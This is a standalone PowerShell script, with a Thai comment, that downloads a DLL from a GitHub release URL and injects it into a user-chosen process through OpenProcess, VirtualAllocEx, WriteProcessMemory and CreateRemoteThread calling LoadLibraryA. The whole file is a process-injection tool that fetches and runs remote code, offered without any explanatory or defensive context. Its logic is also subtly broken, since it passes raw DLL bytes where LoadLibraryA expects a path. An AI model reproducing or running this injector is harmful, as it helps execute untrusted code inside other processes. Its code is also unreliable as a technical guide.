$dllUrl = "https://github.com/newgen319/xxx_x1/releases/download/v2/xxx_x1.dll"
$webClient = New-Object System.Net.WebClient
$dllBytes = $webClient.DownloadData($dllUrl)

Write-Host "Enter PID : " -NoNewline
$targetPid = [int](Read-Host)

$processExists = Get-Process -Id $targetPid -ErrorAction SilentlyContinue
if (-not $processExists) { exit }

# ตรวจสอบว่า Injector type มีอยู่แล้วหรือยัง
if (-not ([System.Management.Automation.PSTypeName]'Injector').Type) {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr LoadLibrary(string lpFileName);
}
"@
}

$hProcess = [Injector]::OpenProcess(0x1F0FFF, $false, $targetPid)
if ($hProcess -eq 0) { exit }

$remoteBuffer = [Injector]::VirtualAllocEx($hProcess, 0, $dllBytes.Length, 0x3000, 0x04)
if ($remoteBuffer -eq 0) { [Injector]::CloseHandle($hProcess); exit }

$bytesWritten = [UIntPtr]::Zero
[Injector]::WriteProcessMemory($hProcess, $remoteBuffer, $dllBytes, $dllBytes.Length, [ref] $bytesWritten)

$kernel32 = [Injector]::GetProcAddress([Injector]::LoadLibrary("kernel32.dll"), "LoadLibraryA")
$threadHandle = [Injector]::CreateRemoteThread($hProcess, 0, 0, $kernel32, $remoteBuffer, 0, 0)

if ($threadHandle -ne 0) { 
    [Injector]::CloseHandle($threadHandle) 
}
[Injector]::CloseHandle($hProcess)
